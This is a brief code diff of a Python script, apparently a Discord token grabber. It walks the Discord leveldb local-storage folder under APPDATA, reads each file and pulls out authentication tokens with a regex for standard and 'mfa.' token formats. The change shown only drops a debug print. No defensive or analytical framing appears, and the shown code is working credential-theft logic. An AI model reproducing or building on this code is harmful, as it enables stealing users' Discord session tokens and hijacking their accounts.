@@ -17,7 +17,6 @@ discdir = os.getenv('APPDATA') + '\\Discord\\Local Storage\\leveldb'
 def discsearch():
     for file in os.listdir(discdir):
         try:
-            print(file)
             file = open(discdir+"\\"+file, "r", errors="ignore")
             content = file.read()
             tokens = re.findall("[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}", content)
